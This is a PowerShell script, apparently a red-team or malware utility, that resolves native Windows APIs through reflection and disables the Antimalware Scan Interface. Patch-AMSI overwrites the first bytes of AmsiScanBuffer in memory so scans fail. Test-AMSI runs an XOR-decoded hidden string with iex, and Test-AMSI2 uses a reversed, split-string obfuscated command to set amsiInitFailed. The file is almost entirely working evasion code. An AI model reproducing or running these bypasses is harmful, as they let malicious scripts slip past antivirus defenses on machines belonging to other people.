# http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
# https://clymb3r.wordpress.com/2013/05/26/implementing-remote-loadlibrary-and-remote-getprocaddress-using-powershell-and-assembly/

function Get-ProcAddress {
    param([string]$Module, [string]$Procedure)

    $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
    $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress')
    $kern32Handle = $getModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $kern32Handle)
    return $getProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleRef, $Procedure))
}


function Get-DelegateType {
    param ([Type[]] $Parameters = (New-Object Type[](0)), [Type] $ReturnType = [Void])

    $domain = [AppDomain]::CurrentDomain
    $dynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $constructorBuilder.SetImplementationFlags('Runtime, Managed')
    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $methodBuilder.SetImplementationFlags('Runtime, Managed')
    $typeBuilder.CreateType()
}


function Patch-AMSI {
    [int64]$AmsiScanBufferAddress = [long](Get-ProcAddress amsi.dll AmsiScanBuffer)
    [UInt32]$Size = 0x4
    [UInt32]$ProtectFlag = 0x40
    [UInt32]$OldProtectFlag = 0

    $virtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
    $virtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $virtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualProtectAddr, $virtualProtectDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    [void]$virtualProtect.Invoke($AmsiScanBufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag)
    [void]$memset.Invoke($AmsiScanBufferAddress, 0xB0, 1)
    [void]$memset.Invoke($AmsiScanBufferAddress+1, 0x01, 1)
    [void]$memset.Invoke($AmsiScanBufferAddress+2, 0xc2, 1)
    [void]$memset.Invoke($AmsiScanBufferAddress+3, 0x18, 1)
    [void]$memset.Invoke($AmsiScanBufferAddress+4, 0x00, 1)
}


function Test-AMSI {
    $base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
    $bytes = [Convert]::FromBase64String($base64)
    $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
    iex $string
}


function Test-AMSI2 {
Sv ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)])
}